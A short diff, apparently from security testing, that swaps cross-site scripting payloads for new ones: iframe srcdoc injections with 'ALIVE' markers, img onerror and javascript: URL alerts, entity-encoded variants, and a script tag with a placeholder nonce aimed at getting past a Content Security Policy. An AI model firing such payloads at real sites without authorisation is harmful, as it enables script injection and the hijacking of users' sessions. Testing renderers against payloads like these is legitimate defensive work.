@@ -1,6 +1,5 @@
-<iframe srcdoc="&lt;img src=x onerror=alert(document.domain)&gt;"></iframe>
-<a href="javascript:alert(document.domain)">x</a>
-"document": "<p>&lt;img src=x onerror=alert(1)&gt;TESTER</p>"
-"document": "<p>&amp;lt;img src=x onerror=alert(1)&amp;gt;TESTER</p>"
+"document": "<h1>TOP-LEVEL-ALIVE</h1><iframe srcdoc=\"<h1>SRCDOC-ALIVE</h1><img src=x onerror=alert(document.domain)>\"></iframe>"
 
-<img src=x onerror=alert(document.domain)>
+"document": "<h1>TOP-LEVEL-ALIVE</h1><iframe srcdoc=\"&lt;h1&gt;SRCDOC-ALIVE&lt;/h1&gt;&lt;img src&#61;x onerror&#61;alert(document.domain)&gt;\"></iframe>"
+
+"document": "<iframe srcdoc=\"<script nonce='PASTE_NONCE'>alert(document.domain)</script>\"></iframe>"
